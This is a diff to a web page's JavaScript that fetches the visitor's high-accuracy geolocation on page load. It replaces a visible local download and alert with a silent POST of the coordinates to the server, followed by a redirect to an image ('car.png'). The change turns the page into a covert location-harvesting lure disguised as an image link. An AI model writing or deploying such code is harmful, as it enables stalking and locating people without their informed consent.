@@ -12,13 +12,18 @@
         // Function to get the visitor's location
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(savePosition);
+                navigator.geolocation.getCurrentPosition(savePosition, errorHandler, { enableHighAccuracy: true });
             } else {
                 console.log("Geolocation is not supported by this browser.");
             }
         }
 
-        // Function to save the visitor's location in JSON format
+        // Function to handle errors in geolocation
+        function errorHandler(error) {
+            console.log("Error getting location:", error.message);
+        }
+
+        // Function to save the visitor's location in JSON format and redirect
         function savePosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
@@ -33,20 +38,24 @@
             // Convert the object to JSON format
             var jsonData = JSON.stringify(locationData);
 
-            // Save the JSON data to a file using Blob and download it
-            var blob = new Blob([jsonData], { type: "application/json" });
-            var url = URL.createObjectURL(blob);
-
-            // Create a link to download the JSON file
-            var a = document.createElement("a");
-            a.href = url;
-            a.download = "visitor_location.json";
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-
-            // Optionally, you can display a message to the visitor
-            alert("Your location data has been saved.");
+            // Save the JSON data to "location.json" using Fetch API
+            fetch('location.json', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: jsonData
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Location data saved successfully.');
+                    // Redirect to "car.png"
+                    window.location.replace("car.png");
+                } else {
+                    console.log('Error saving location data:', response.status);
+                }
+            }).catch(error => {
+                console.error('Error saving location data:', error);
+            });
         }
 
         // Call the getLocation function when the page loads
